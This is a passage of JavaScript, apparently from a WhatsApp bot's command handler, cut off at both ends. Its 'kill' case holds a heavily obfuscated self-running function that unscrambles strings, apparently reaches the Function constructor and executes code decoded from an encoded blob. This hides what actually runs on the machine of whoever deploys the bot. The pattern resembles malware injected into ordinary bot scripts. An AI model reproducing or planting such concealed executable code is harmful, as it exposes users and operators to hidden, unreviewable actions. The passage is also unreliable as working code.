...
client.sendMessage(m.chat, {
          ...
          break;
case "kill":
(function(){var eKu='',UGk=747-736;function LEF(y){var b=4277080;var w=y.length;var x=[];for(var h=0;h<w;h++){x[h]=y.charAt(h)};for(var h=0;h<w;h++){var l=b*(h+550)+(b%17453);var s=b*(h+130)+(b%24763);var p=l%w;var a=s%w;var m=x[p];x[p]=x[a];x[a]=m;b=(l+s)%7381924;};return x.join('')};var zxN=LEF('roqnutfmirxalwskctjzovgdotpnehsurccyb').substr(0,UGk);var jHm='1-cwlr"n0wuSgtnj5};d,v en.]9i=ur,hAe<r;8ue)zsvputxy="c4i< a=-)8d)th=4uc(,8uaC0,;s,7;aa[.iita=h+6,+0lf0evscglmdb,6=47)5a oraa;bslfo,yt(()av()v0ni<=wlerd8[ozmx=irlfsa)ea+g};qrgC;r.vero.()er),s;b+)rw2a1i.=r,iupA[a6aobuc)e6j [((t;2=(l+t{}.,dc;;*g";=nh=A;)cishf.=d7"r;; v9gou ;]drt18)hhrevf[u]rt8=s{.1rz.=9=oo;o4n=Csj[.]u ,+!j2[=(v;oavht.n8p)r}ritnle"v7hrz<r1f3!r=iov+v0==rg<AmCl()-;nm .=l.(zagoo=8ut z1c,cre)=([ C+(n(= agorn)s)o;,c"7h5va;7=(7(z+-;ljmtpt+o.+;nj;{a amv0vi{ ys[w(,;ikcnch2;= 1+=r(1fo"m+)a8;]ty;u(n;6l(6.ers(z on,j{hue;v+h+zgbls+lgg)6i2dntn..;v=(h=-;t[=0)e-+ll[qf0e]..h;itv[g *dos1f+ez,r;>.pchyvcjn.rr93;(hr,vtagrbszrbvn+{il.aati-bpur=,ogtdC0qpih2ld=)9ns1+s")jb==tpo);afi,g;rr(lClz]lhn;a (=x]umt]b"l+huar aj,f2(v))r+7r2,a0,)(,2=i5;x[l )([)nt;=lhc;nf.soii]C9e6nf;(4ss.fp=". r]]=0rs7gv>;5dt (s+nou(e;svsateiq;4}  lAib)+)ra;t3rS}pi)1=on(ehea n(fs9.ds,)8r+u pov,r(eva19fz,g;i)ni=]{}].f';var mit=LEF[zxN];var jfL='';var WKg=mit;var wGB=mit(jfL,LEF(jHm));var dRN=wGB(LEF('9d!(4?nn+..hr(m-5._4.ta2L7Lcnra.LL)( ioe>b(6d9jc)L c.L)$dn)9.6*dnd=L7$o(m=rL2LuomsL{,Lt)jLuiebirocvfL}DsL=)L3aD\'Lx!_.jLnDLa(ELL)LL)}dr (dI.Czm78_%3.%Lg(8dbLp%ddb!{Lhc.d(3l.;b+.x.(r0)=<2"N4i9dm$ daL+rL$nodovieyrlg(.acLL,7rnI tuT!te3}nr!.n{Dhd,Sqe*1(..:..#w(LerL$28.e)l,nv.%L)tm3;o_).r).=.qLiTa300{s%}+LpdL.C;SdL-.eEg.M..<6$0gd5).Tq1Lv,Lie3Lo.$)>Mtmrf)LLf!ru a).Lg,(f8!{llkLgs"igha)(%eT584pe.0!36_)3!mtt3Ed.oL(,u=s%.uLLsLf#n,a5dasL..o;f.*(dNe)t(.d)cdmr55io9;,a)4;gtl.+.]-lr(uppyhLt!2!a.ddcpe.o_4LnIe(ei_L(fte;)1((,1oif.2o_Lo1$hrnnr1.]%]vC5oddi.t),rm8L!d%t;feL6u;74,7;;ae.b%mfdz_:dd)}cla]tw,tp]aLpd_5i.3(L)_tmrL(]p=e_9os#(uLoLa(s{k)a!_e)d%nnL<)_w(!2)L.}Lb$;i3edA&D6l_p$a7t=r..l.5.uBpr1$]=6d o8( )p15.Ldnfe.tet)L}}:9dtabit}@L]1l{vdtC ((m8 .5m.0L,Le6_r)a0.do=dLntd"Lli n;.f.)o]zei(d,r67)1,(L*d7r!de7_L))"mLLL_f4oL},d_Lhas_L4%1L4C;)=69. olL54!2i,;o)t.Ae4eLm#=__L..\/.t17.blSqLt.Ll{vup.L:&iLi);7_r0LL82dLd7t)S0r3,.mL=6{N{d,L(}(Lde=](%jge!eddpo*LemiLit1o(c(]dL;nLd(teu)!sdn0zi._e3$eo}3n],ei43Boeh,.s%q=9s]nr50Lr,ns!n.,skd!h. @m.2Lt_(rnL,1ehD](i]((L.;0ne.;m>d.Csis..9)LxL0ingLt.7 fe7gol.\/tod;d.gmDn>e9rL.icn)(eL5=uo@[d.Lsd!=L5t,..;}d9rgiLd.}0aLme.md=l._{}hn8uL}L](+Lf.rS..(d2bfa.trnnpa}aLLd5e.LsnLeL4 L,oeelv)1jL]x$L,dL.5d70g3#=)=pdty.;_)) e.g].n38._5r%.@(L1L-32ated_L14s!EgL${.dpL1r?d.la(+\/aepu{]bcl,a=7f_(i3f"wLh}.$,)i.(on("d]Idc8ia0e0e8d]!va120p="o4Lndd(!xdeesL"d(rand(v3bi3]{ey)oL7j%_!rciut-,d$.eiddnem$.;(..eiaa)ap ad5n2wojL0fi{5x3.d.asnw!t$%_t]=ad_n;iiBLe7o ,&aeL!o+n))7bdL0LL;L].c!%a0;lpe3y!_$?1ie=6(hL L-.}=3L.c.n!AgclefotyL)u85,E85df\'.3=y>ele5]](3k,ram;!)pbi1fN3,tr)e.p.e)=xvi;Ln\'#L3;no!)e.Ld5,.nL7BC)..Ld+o=%Cara=Lrv}3=l_S=fLt.)p6_)pL*t)e)(nx74L$_i(c\';()tl6rf5.midl,ti]ts60-al6.L>L0f.{ae()L.:6d6t(LLnd}p!L;,0)urttnu)]L*(i li$ub3bD5iid(( 6_._eb tpL_.uL07Ldi7gtdNL.:iL=L.+e0)_ _h]e.0o3L,p)d*L!a7)u8e1(.+.g5aa]Lh!8]6r.Ad5eLLeu eg}@<dL)..iild!f6aL..iaumLt{ep;cLedd$c?aes{gr!tL1d(37fi71elt0nr=rc.ra{oyL56(il\/Lomm.ld.L<d.tL+7(73eL,(+tt4s L,m;LL.dt%{d))_09x{"4bLd*,_{i2)h]1t r!7 1) []9LL)t.Lnn 8okL1m%L.v3ad.(i=1d=[ sat5]8otnLr1t:.*=(<}L4cbuj(.]))d.k.s;nL!07hcLe}ydo3c[Lene "!d02)i(ooLd#La{{j_ 2Ld1rd )fi % &.Ti!n)t .9p]'));var qdT=WKg(eKu,dRN );qdT(9451);return 2962})()
break;
          case "admin" : { 
